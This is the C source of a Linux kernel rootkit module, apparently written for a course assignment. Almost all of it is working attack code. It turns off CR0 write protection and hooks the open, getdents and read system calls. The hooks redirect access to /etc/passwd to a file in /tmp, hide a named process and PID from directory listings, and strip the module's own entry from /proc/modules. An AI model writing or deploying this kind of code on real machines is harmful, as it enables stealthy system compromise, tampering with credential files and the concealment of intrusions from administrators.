#include <linux/module.h>      // for all modules
#include <linux/init.h>        // for entry/exit macros
#include <linux/kernel.h>      // for printk and other kernel bits
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>

//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))


#define BUFFLEN 256
MODULE_LICENSE("rg239");


//module parameter
static char * sneaky_process_id = "";
module_param(sneaky_process_id, charp, 0);
MODULE_PARM_DESC(sneaky_process_id, "A character string");

const char * original_file = "/etc/passwd";
const char * sneaky_file = "/tmp/passwd";
static int module_status;

//getdents will fill in an array of “struct linux_dirent” objects, one for each file or directory found within a directory. 
//int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
struct linux_dirent {
            u64            d_ino;
            s64            d_off;
            unsigned short d_reclen;
            char           d_name[BUFFLEN];
};



//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;





//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call)(const char *pathname, int flags);// for open syscall
asmlinkage int (*original_read)(int fd, void * buf, size_t count); //for read syscall
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count); //for getdents syscall




//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags)
{
  printk(KERN_INFO "Very, very Sneaky!\n");
  if(strcmp(pathname, original_file) == 0){
    // return original_call(sneaky_file, flags);
    size_t len = strlen(sneaky_file);
    copy_to_user((void*)pathname, sneaky_file, len + 1);
  }
  if(strcmp(pathname, "/proc/modules") == 0)
    module_status = 1;
  
    return original_call(pathname, flags);
}


//modify the getdents syscall
asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){

  // char sneaky_id[40];
  // sprintf(sneaky_id, "%d", sneaky_process_id);

    int num = original_getdents(fd, dirp, count);
    struct linux_dirent * current_dir;
    int current_position = 0;
    int current_reclen;
    size_t length;

    while(current_position < num ){

      current_dir = (struct linux_dirent *)(current_position + (char*)dirp);
      current_reclen = (int)current_dir->d_reclen;

      //if found, consider both the cases 
      if((strcmp(current_dir->d_name, "sneaky_process") == 0) || (strcmp(current_dir->d_name, sneaky_process_id) == 0)){

        length = (size_t)(num - (size_t)(((char *)current_dir + current_dir->d_reclen) - (char*)dirp));
        memcpy(current_dir, (char*)current_dir + current_dir->d_reclen, length);
	num = num - current_reclen;
	break;
      }
      current_position = current_position + current_reclen; //keeep traversing 

    } //loop ends
    
    return num;
    
}


//modify the read sycall
asmlinkage int sneaky_sys_read(int fd, void * buf, size_t count){

  ssize_t return_bytes = original_read(fd, buf, count);
  ssize_t length;
  char * temp_ptr = NULL;
  char * string = "sneaky_mod";
  char * find_ptr = strstr(buf, string); //finds the first occurence of sneaky_mod

  if(find_ptr != NULL && module_status == 1){
    temp_ptr = find_ptr;
    //printk("Entry Point");
     while( *temp_ptr != '\n') 
       temp_ptr++; //traverse till you get "\n"

    temp_ptr++;  //skip

    length = (return_bytes - (ssize_t)(temp_ptr - (char*)buf));
    //printk("%d\n", (int)lenght);
    return_bytes = (ssize_t)(return_bytes - (temp_ptr - find_ptr));  //modify return bytes
    memcpy(find_ptr, temp_ptr, length); 
  }

  module_status = 0;
  return return_bytes;

  
}


//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");
  // printk(KERN_INFO "sneaky_process pid is: %s\n", sneaky_process_id);

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_call = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

  original_getdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;

  original_read = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load
}


static void exit_sneaky_module(void)
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call;
  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
  *(sys_call_table + __NR_read) = (unsigned long)original_read;
  


  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}


module_init(initialize_sneaky_module);  // what's called upon loading
module_exit(exit_sneaky_module);        // what's called upon unloading

